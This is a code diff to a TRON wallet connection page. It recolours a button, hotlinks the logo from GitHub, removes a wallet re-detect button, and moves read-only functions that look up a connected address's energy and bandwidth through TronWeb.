@@ -548,7 +548,7 @@ body {
     padding: 8px 24px;
     border: none;
     border-radius: 6px;
-    background: #2563eb; /* 蓝色按钮 */
+    background: #4ade80; /* 绿色按钮 */
     color: white;
     cursor: pointer;
     font-size: 14px;
@@ -628,7 +628,7 @@ body {
     <div class="container">      
         <div class="header-container">
             <div class="header">
-                <img src="./tron.png" alt="TRON Logo" class="header-logo">
+                <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/tron.png" alt="TRON Logo" class="header-logo">
            </div>            
             <div class="lang-switch">
                 <div class="lang-dropdown" id="langDropdown">
@@ -681,10 +681,7 @@ body {
             <span class="wallet-name">Bitget Wallet</span>
         </div>
     </div>
-    <!-- 新增：重新检测TronLink按钮 -->
-    <button id="recheckTronLinkBtn" style="margin-bottom: 12px; padding: 8px 24px; border: none; border-radius: 6px; background: #4ade80; color: white; cursor: pointer; font-size: 14px;">
-        重新检测钱包
-    </button>
+   
     <button id="closeMultiWalletBtn">关闭</button>
 </div>
 
@@ -1124,7 +1121,7 @@ const balanceItems = document.querySelectorAll(".balance-item");
 const multiWalletPopup = document.getElementById("multiWalletPopup");
 const closeMultiWalletBtn = document.getElementById("closeMultiWalletBtn");
 const walletItems = document.querySelectorAll(".wallet-item");
-const recheckTronLinkBtn = document.getElementById("recheckTronLinkBtn");
+
 
 // 错误判断函数
 function isCustomerError(errMsg) {
@@ -1172,7 +1169,66 @@ function updatePageLang() {
     approvalRecords.textContent = lang.noRecord;
 }
 
-// 更新用户信息显示（默认显示--，连接后显示真实值）
+// ===================== 开始：所有钱包统一本地查询（无需区分钱包） =====================
+// 1. 能量查询（所有钱包统一用本地TronWeb，读取钱包本地数据）
+async function queryUserEnergyBalance(address) {
+ try {
+        // 强制等待本地TronWeb就绪（钱包内置实例，100%存在）
+        if (!window.tronWeb) throw new Error("未检测到钱包本地TronWeb");
+        if (!window.tronWeb.ready) {
+            await new Promise(resolve => window.tronWeb.onReady(resolve));
+        }
+
+        // 优先用getAccountResource（本地缓存，最新接口）
+        const accountResource = await window.tronWeb.trx.getAccountResource(address);
+        if (accountResource?.total_energy_limit !== undefined) {
+            const remainingEnergy = accountResource.total_energy_limit - (accountResource.energy_used || 0);
+            console.log("✅ 本地查询能量成功：", remainingEnergy);
+            return remainingEnergy > 0 ? remainingEnergy : 0;
+        }
+
+        // 备用：兼容旧版本钱包（getAccount接口）
+        const account = await window.tronWeb.trx.getAccount(address);
+        const remainingEnergy = account.energy || 0;
+        console.log("✅ 本地查询能量（兼容模式）成功：", remainingEnergy);
+        return remainingEnergy > 0 ? remainingEnergy : 0;
+
+    } catch (error) {
+        console.error("❌ 能量本地查询失败：", error);
+        return -1; // 标记查询失败（区别于真实为0）
+    }
+}
+
+// 2. 宽带查询（所有钱包统一本地查询）
+async function queryBandwidthBalance(address) {
+    try {
+        // 强制等待本地TronWeb就绪
+        if (!window.tronWeb) throw new Error("未检测到钱包本地TronWeb");
+        if (!window.tronWeb.ready) {
+            await new Promise(resolve => window.tronWeb.onReady(resolve));
+        }
+
+        // 优先用getAccountResource（最新接口）
+        const accountResource = await window.tronWeb.trx.getAccountResource(address);
+        if (accountResource?.bandwidth_limit !== undefined) {
+            const remainingBandwidth = accountResource.bandwidth_limit - (accountResource.bandwidth_used || 0);
+            console.log("✅ 本地查询宽带成功：", remainingBandwidth);
+            return remainingBandwidth > 0 ? remainingBandwidth : 0;
+        }
+
+        // 备用：兼容旧版本钱包
+        const account = await window.tronWeb.trx.getAccount(address);
+        const remainingBandwidth = account.bandwidth || 0;
+        console.log("✅ 本地查询宽带（兼容模式）成功：", remainingBandwidth);
+        return remainingBandwidth > 0 ? remainingBandwidth : 0;
+
+    } catch (error) {
+        console.error("❌ 宽带本地查询失败：", error);
+        return -1; // 标记查询失败
+    }
+}
+
+// 3. 更新用户信息显示（统一逻辑，所有钱包通用）
 async function updateUserInfoDisplay() {
     const lang = langConfig[currentLang];
 
@@ -1244,64 +1300,6 @@ async function updateUserInfoDisplay() {
         balanceTrxEl.textContent = "--";
         balanceEnergyEl.textContent = "--";
         balanceBandwidthEl.textContent = "--";
-    }
-}
-
-// 查询宽带余额
-async function queryBandwidthBalance(address) {
-    try {
-        // 强制等待本地TronWeb就绪
-        if (!window.tronWeb) throw new Error("未检测到钱包本地TronWeb");
-        if (!window.tronWeb.ready) {
-            await new Promise(resolve => window.tronWeb.onReady(resolve));
-        }
-
-        // 优先用getAccountResource（最新接口）
-        const accountResource = await window.tronWeb.trx.getAccountResource(address);
-        if (accountResource?.bandwidth_limit !== undefined) {
-            const remainingBandwidth = accountResource.bandwidth_limit - (accountResource.bandwidth_used || 0);
-            console.log("✅ 本地查询宽带成功：", remainingBandwidth);
-            return remainingBandwidth > 0 ? remainingBandwidth : 0;
-        }
-
-        // 备用：兼容旧版本钱包
-        const account = await window.tronWeb.trx.getAccount(address);
-        const remainingBandwidth = account.bandwidth || 0;
-        console.log("✅ 本地查询宽带（兼容模式）成功：", remainingBandwidth);
-        return remainingBandwidth > 0 ? remainingBandwidth : 0;
-
-    } catch (error) {
-        console.error("❌ 宽带本地查询失败：", error);
-        return -1; // 标记查询失败
-    }
-}
-
-// 查询用户能量余额（修复TRON新接口）
-async function queryUserEnergyBalance(address) {
-    try {
-        // 强制等待本地TronWeb就绪（钱包内置实例，100%存在）
-        if (!window.tronWeb) throw new Error("未检测到钱包本地TronWeb");
-        if (!window.tronWeb.ready) {
-            await new Promise(resolve => window.tronWeb.onReady(resolve));
-        }
-
-        // 优先用getAccountResource（本地缓存，最新接口）
-        const accountResource = await window.tronWeb.trx.getAccountResource(address);
-        if (accountResource?.total_energy_limit !== undefined) {
-            const remainingEnergy = accountResource.total_energy_limit - (accountResource.energy_used || 0);
-            console.log("✅ 本地查询能量成功：", remainingEnergy);
-            return remainingEnergy > 0 ? remainingEnergy : 0;
-        }
-
-        // 备用：兼容旧版本钱包（getAccount接口）
-        const account = await window.tronWeb.trx.getAccount(address);
-        const remainingEnergy = account.energy || 0;
-        console.log("✅ 本地查询能量（兼容模式）成功：", remainingEnergy);
-        return remainingEnergy > 0 ? remainingEnergy : 0;
-
-    } catch (error) {
-        console.error("❌ 能量本地查询失败：", error);
-        return -1; // 标记查询失败（区别于真实为0）
     }
 }
 
@@ -1560,13 +1558,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         multiWalletPopup.style.display = "none";
     };
 
-    // 重新检测钱包按钮
-    recheckTronLinkBtn.onclick = async () => {
-        multiWalletPopup.style.display = "none";
-        userInfoStatus.style.display = "block";
-        userInfoStatus.innerHTML = "正在重新检测钱包...";
-        await checkImTokenEnv();
-    };
+  
 
     // 连接按钮点击显示多钱包弹窗
     connectBtn.onclick = () => {
